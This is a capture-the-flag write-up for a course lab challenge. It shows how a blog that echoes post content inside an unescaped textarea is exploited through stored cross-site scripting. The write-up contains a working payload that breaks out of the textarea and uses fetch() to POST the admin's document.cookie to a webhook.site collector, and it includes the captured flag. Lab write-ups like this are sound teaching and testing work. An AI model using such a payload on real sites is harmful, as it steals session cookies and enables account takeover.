# Challenge `Go on and censor my posts` writeup

- Vulnerability:
  - _Endpoint has a **Cross Site Scripting (XSS)** vulnerability_
- Where:
  - _When writing the content, it will be displayed without any parsing in a unprotected `<textarea>` endpoint_
- Impact:
  - _Allows to **obtain the admin's cookies** by injecting malicious code in the content part of a blogpost_

## Steps to reproduce

First we connected to the server `http://mustard.stt.rnl.tecnico.ulisboa.pt:22253`. We can see that now the server allows anyone to submit new blogposts. Looking further, we make a 'test' post, and check the source code of the page. 
We can see that the content of the post is being displayed in a `<textarea>` tag, (seemingly) without any protection. This means that the server is probably vulnerable to **XSS**. Here is where the content is displayed:

```html
<textarea class="form-control" name="content" id="contentArea" rows="10" >Here is where the content is displayed...</textarea>
```

Having found a way to inject code in the page, we will lure the admin to perform a request to the site where we are collecting the cookies. Since we did not have any site of our own we used a online service to collect our https requests [Webhook](https://webhook.site/). 

The following payload its what will be inserted. By starting with `</textarea>`, the html will read it as finished, and will continue to read the rest of the code as normal html. The `fetch()` method will be triggered when the page is loaded, and will send a `POST` request with the `document.cookie`.

```html
</textarea><script>fetch('https://webhook.site/a0e83e7e-be55-4740-8180-f38200e300ea', {method: 'POST',mode: 'no-cors',body:document.cookie});</script></textarea>
```
This will only be effective when we choose to send it using the following button: `Update post and send it for admin review`.

As soon as the admin **'clicked the link',** we received the following cookie in the http request on our website:
```SECRET=SSof{Reject_this_blogpost.Too_many_weird_chars.I_dont_get_it}```

Now, we were able to store the request in a website we control and therefore have possession of the admin's cookie obtaining the **flag**.
